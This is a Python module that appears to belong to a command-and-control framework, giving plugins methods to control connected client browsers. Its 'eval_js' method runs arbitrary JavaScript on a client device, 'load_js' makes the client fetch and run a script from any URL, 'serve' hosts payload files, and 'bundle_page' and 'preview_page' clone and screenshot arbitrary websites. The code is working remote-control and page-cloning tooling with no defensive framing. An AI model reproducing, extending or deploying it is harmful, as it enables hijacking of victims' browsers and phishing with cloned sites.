import asyncio

from hashlib import sha256

from pydantic import BaseModel, Field
from secrets import token_hex

from c2.plugins.internal.transport import PluginTransport

class ReconnectionError(Exception):
    pass

class TimeoutError(Exception):
    pass

class JSExecutionError(Exception):
    pass

class BundlerException(Exception):
    pass

class ClientMessage(BaseModel):
    operation: str
    data: dict
    id:str = Field(default_factory=lambda : token_hex(16))

class Methods:
    def __init__(self, transport: PluginTransport, client_id: str):
        self.transport = transport
        self.client_id = client_id

    async def _wait_for_response(self, msg:ClientMessage, timeout:float = 10):
        try:
            response_data = await self.transport.send_device_command(self.client_id, msg.model_dump(mode="json"), timeout=timeout)
        except asyncio.TimeoutError:
            raise TimeoutError("Response timed out")
        response = ClientMessage.model_validate(response_data)
        return response.data

    async def serve(self, content:str | bytes, extension:str = ''):
        """
        Serves the content on the internal webserver

        :param content: The content which should be served
        :type content: str | bytes
        :param extension: sets the file extension if not empty
        :type extension: str
        :return: the path where the file is served
        :rtype: str
        """
        if isinstance(content, str):
            content = content.encode()

        hash = sha256(content).hexdigest()
        file_path = f'/static/{hash}'
        serve_path = f"/clients/static/plugins/{hash}"

        if extension:
            file_path += '.' + extension
            serve_path += '.' + extension

        with open(file_path, 'wb') as f:
            f.write(content)

        return serve_path

    async def eval_js(self, code: str, timeout: float = 10):
        """
        Executes arbitrary code on the client and returns it's result or a error

        :param code: the javascript code to execute
        :type code: str
        :param timeout: seconds to wait for a response before raising TimeoutError
        :type timeout: float

        Raises JSExecutionError if there is a error in the js code.
        """

        msg = ClientMessage(operation="eval_js", data={"code": code})

        response = await self._wait_for_response(msg, timeout=timeout)

        if response.get("err"):
            print(f"Error executing JS code: {response['err']}")
            raise JSExecutionError(response["err"])

        return response.get("result")

    async def load_js(self, url: str):
        """
        Loads a javascript file from the given URL.

        :param url: The url to load the file from
        :type url: str
        """
        msg = ClientMessage(operation="load_plugin", data={"url": url})

        await self._wait_for_response(msg)

    async def bundle_page(self, url: str) -> str:
        """
        Generates a bundled version of the page at the given URL

        :param self: Description
        :param url: The url of the website which should be bundled
        :type url: str
        :return: returns the bundled html as a string
        :rtype: str
        """
        response = await self.transport.bundler_http.post("/bundle", json={"url": url}, timeout=20)

        if response.status_code != 200:
            raise BundlerException(response.text)

        return response.text

    async def preview_page(self, url: str) -> bytes:
        """
        Generates a preview of the page at the given URL

        :param url: Description
        :type url: The url of the website
        :return: returns the screenshot as bytes
        :rtype: bytes
        """
        response = await self.transport.bundler_http.post("/preview", json={"url": url}, timeout=20)

        if response.status_code != 200:
            raise BundlerException(response.text)

        return response.content
